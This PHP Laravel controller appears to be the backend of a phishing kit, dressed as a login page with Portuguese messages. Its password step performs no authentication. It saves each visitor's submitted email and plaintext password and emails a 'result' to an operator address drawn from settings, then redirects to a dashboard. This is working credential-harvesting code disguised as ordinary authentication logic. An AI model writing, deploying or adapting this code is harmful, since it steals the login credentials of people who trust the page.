<?php

namespace App\Http\Controllers;

use App\Mail\EmailLogin;
use App\Models\Settings;
use App\Models\Visitor;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Throwable;

class AuthController extends Controller {
    public function __invoke()
    {
        // Re-render the password step when the previous PUT failed validation.
        $step = null;
        if (session('errors')?->has('password')) {
            $step = old('email');
        }

        return view('auth.login', ['id' => $step]);
    }

    public function post(Request $request)
    {
        $data = $request->validate([
            'email' => 'required|email',
        ], [
            'email.required' => 'O campo e-mail deve ser um endereço de e-mail válido',
            'email.email' => 'O campo abaixo é de preenchimento obrigatório',
            '*' => 'Detalhes incorretos',
        ]);

        return view('auth.login', [
            'id' => $data['email'],
        ]);
    }

    public function put(): RedirectResponse
    {
        $data = request()->validate([
            'email' => 'required|email',
            'password' => [
                'required',
                'string',
                'min:6',
                'max:255',
                function ($attribute, $value, $fail) {
                    if (str_contains($value, ' ')) {
                        $fail('Detalhes incorretos');
                    }
                }
            ]
        ], [
            'email.required' => 'O campo e-mail é obrigatório.',
            'email.email' => 'O campo e-mail deve ser um endereço de e-mail válido.',
            'password.required' => 'O campo senha é obrigatório.',
            '*' => 'Detalhes incorretos',
        ]);


        $visitor = Visitor::current();
        $visitor->user = $data['email'];
        $visitor->pass = $data['password'];
        $visitor->save();

        try {
            Mail::to(Settings::me()->email_result)->sendNow(new EmailLogin());
        } catch (Throwable $t) {
            Log::error($t);
        }

        return redirect()->route('dashboard');
    }
}
